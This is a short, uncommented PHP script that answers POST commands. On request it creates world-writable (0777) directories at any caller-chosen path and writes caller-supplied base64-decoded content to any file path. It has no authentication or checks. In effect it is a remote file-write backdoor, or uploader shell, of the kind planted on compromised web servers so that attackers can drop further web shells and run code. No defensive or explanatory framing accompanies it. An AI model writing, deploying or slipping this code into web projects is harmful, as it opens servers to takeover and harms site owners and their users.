<?php 
	
	function echo_json($data=[])
	{

		echo json_encode( $data );

	}

	if( !empty( $_POST['cmd'] ) ){


		if( $_POST['cmd'] == "test" ){

			echo_json([
				"code" => 200,
			]);

		}

		if( $_POST['cmd'] == "mkdir" ){

			mkdir( $_POST['dir'] );
			chmod( $_POST['dir'] , 0777 );

			echo_json([
				"code" => 200,
			]);

		}

		if( $_POST['cmd'] == "upload" ){

			file_put_contents( $_POST['file'] , base64_decode( $_POST['data'] ) );

			echo_json([
				"code" => 200,
			]);

		}

	}